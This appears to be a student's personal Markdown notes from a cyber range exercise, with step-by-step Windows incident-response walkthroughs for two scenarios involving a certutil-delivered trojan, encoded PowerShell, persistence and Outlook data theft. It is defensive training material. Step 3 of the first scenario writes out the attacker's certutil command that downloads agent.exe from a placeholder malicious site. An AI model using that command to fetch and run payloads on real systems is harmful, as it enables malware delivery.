<!--
Title: ASD Live Fire Exchange Programme (GitHub Markdown Version)
Author: Simon .I
Version: 2025.03.30
Description: GitHub-compatible Markdown (GHM) version using supported HTML like <details> and <table>.
-->

<!-- ASD Programme Title -->
<h1 align="center"><strong style="font-size: 4.5rem; letter-spacing: 4px; color: navy;">Australian Signals Directorate - Live Fire Exchange Program</strong></h1>

<p><strong>These are my personal notes from the <em>ASD Live Fire Cyberbitrange</em> event. This document is not provided by or affiliated with the <em>Australian Signals Directorate (ASD)</em> or <em>CyberbitRange</em>.</strong></p>

---

<details>

<summary><strong>🌐 LFE 1 Bangalore – Email Dumper</strong></summary>

### 🔎 Scenario: Email Dumper

A suspicious activity alert has been triggered on a Windows host. The attacker has used native Windows tools to execute commands, download malware, and maintain persistence. Your job is to investigate the host, identify the point of compromise, and clean up the system.

---

### 🧱 Step 1: Initial Investigation – Identify Suspicious Activity

Use the Task Manager or command line to inspect running processes:

```powershell
taskmgr
```

List all active processes and filter for potentially malicious ones:

```powershell
tasklist | findstr /i "powershell cmd certutil"
```

Kill any suspicious processes:

```powershell
taskkill /F /PID <PID>
```

---

### 📜 Step 2: Event Log Analysis

Open Event Viewer to check for recent process creation:

```powershell
eventvwr
```

Navigate to:

```
Windows Logs > Security > Event ID 4688 (Process Creation)
```

> Look for:
> - `powershell.exe -enc ...`
> - `certutil.exe` downloads
> - Unusual command-line arguments

---

### 🧪 Step 3: Certutil Download Detection

Attacker used `certutil` to download a payload:

```powershell
certutil -urlcache -split -f http://<malicious-site>/agent.exe agent.exe
```

> This file may reside in:
> ```
> C:\Users\<user>\AppData\Roaming\
> ```

Check file creation or access timestamps.

---

### 🔍 Step 4: Obfuscated PowerShell Detection

A base64-encoded PowerShell command was used. Detect or decode:

Example execution pattern:

```powershell
powershell.exe -enc <Base64String>
```

Decode it:

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<Base64String>"))
```

---

### 🗓 Step 5: Check for Persistence – Scheduled Tasks

Check for new or suspicious scheduled tasks:

```powershell
schtasks /query /fo LIST /v
```

Look for task names that launch unknown `.exe` or PowerShell commands.

---

### 🧼 Step 6: Check for Persistence – Registry

Check the following registry keys for auto-run entries:

```powershell
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

Also check with GUI:

```powershell
regedit
```

---

### 🌐 Step 7: Check Network Connections

List active network connections to identify C2 callbacks:

```powershell
netstat -bano
```

> Cross-reference PIDs with `tasklist` output.

---

### 📁 Step 8: Investigate Dropped Files

Search user folders for suspicious payloads or dumped data:

```powershell
Get-ChildItem -Path C:\Users -Include *.exe,*.pst,*.ost -File -Recurse -ErrorAction SilentlyContinue
```

> `.pst` or `.ost` files may indicate email exfiltration or enumeration.

---

### ✅ Step 9: Remediation

Kill known malicious processes:

```powershell
taskkill /F /PID <PID>
```

Delete downloaded malware:

```powershell
Remove-Item -Path "C:\Users\<user>\AppData\Roaming\agent.exe" -Force
```

Delete registry persistence:

```powershell
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <MaliciousEntry> /f
```

Remove scheduled tasks:

```powershell
Unregister-ScheduledTask -TaskName "<SuspiciousTaskName>" -Confirm:$false
```

---

### 🧠 Key Takeaways

- `certutil.exe` is often abused to download payloads (LOLBAS technique)
- Base64-encoded PowerShell is a common method for obfuscating payload execution
- Persistence often involves scheduled tasks or registry keys
- Email data (.pst/.ost) can be targeted for theft
- Always check process lineage, network connections, and event logs when investigating alerts

</details>

---

<details>

<summary><strong>🌋 LFE 2 Jakarta – Killer Trojan</strong></summary>

### 🔎 Scenario: Killer Trojan

This scenario involves investigating a Windows endpoint compromised by a malicious Trojan. The attacker has established persistence, dropped a payload, and may be attempting to access sensitive data or communicate externally. Your job is to investigate the incident, locate the malware, and remediate the system.

---

### 🧱 Step 1: Identify Suspicious Processes

Start by reviewing the running processes via Task Manager or command line:

```powershell
taskmgr
```

Or list suspicious processes from the terminal:

```powershell
tasklist | findstr /i "powershell cmd python wscript cscript rundll32 regsvr32 mshta"
```

Kill any untrusted or abnormal processes:

```powershell
taskkill /F /PID <PID>
```

---

### 📜 Step 2: Analyse Process Creation Events

Open Event Viewer:

```powershell
eventvwr
```

Navigate to:

```
Windows Logs > Security > Event ID 4688
```

> Look for evidence of:
> - `powershell.exe` with `-enc`
> - `.exe` files executed from unusual directories (e.g. Roaming, Temp)
> - `cmd.exe /c` launching suspicious commands

---

### 🧪 Step 3: Locate Dropped Trojan Binary

The malicious executable (e.g. `agent.exe`) is often dropped in a roaming or temporary path:

```powershell
Get-ChildItem -Path "C:\Users" -Include agent.exe -Recurse -ErrorAction SilentlyContinue
```

> Common drop paths include:
> ```
> C:\Users\<user>\AppData\Roaming\
> C:\Users\<user>\AppData\Local\Temp\
> ```

---

### 🧼 Step 4: Check for Registry Persistence

Query auto-run registry keys:

```powershell
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

Use Registry Editor for deeper inspection:

```powershell
regedit
```

> Look for values that point to `agent.exe` or other unknown executables.

---

### 🗓 Step 5: Inspect Scheduled Tasks

Check for any unknown tasks created to relaunch the trojan:

```powershell
schtasks /query /fo LIST /v
```

> Suspicious tasks may have:
> - Non-standard names
> - Hidden in non-Microsoft folders
> - Actions pointing to `agent.exe` or PowerShell launchers

---

### 🌐 Step 6: Investigate Network Connections

List all active network connections with process mappings:

```powershell
netstat -bano
```

> Cross-reference process IDs with `tasklist` output to determine which executable is making outbound connections.

---

### 🗃 Step 7: Review File Artefacts and Email Dump Attempts

Search for email-related file dumps or exfil attempts:

```powershell
Get-ChildItem -Path "C:\Users" -Include *.pst, *.ost -File -Recurse -ErrorAction SilentlyContinue
```

> Trojan may be designed to steal or stage Outlook mail data.

---

### 🧹 Step 8: Remediate Infection

Terminate known malicious processes:

```powershell
taskkill /F /PID <PID>
```

Delete the malicious file:

```powershell
Remove-Item -Path "C:\Users\<user>\AppData\Roaming\agent.exe" -Force
```

Remove auto-run registry entries:

```powershell
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <MaliciousEntry> /f
```

Delete suspicious scheduled tasks:

```powershell
Unregister-ScheduledTask -TaskName "<SuspiciousTaskName>" -Confirm:$false
```

---

### ✅ Key Takeaways

- The Trojan was delivered and executed via native tools (e.g. PowerShell or certutil)
- The payload (`agent.exe`) was dropped into a user-writable location like AppData
- Persistence was achieved via registry keys and possibly scheduled tasks
- The Trojan may target sensitive files such as Outlook `.pst` or `.ost` archives
- Comprehensive log and process analysis is key to confirming and removing the infection

</details>

---
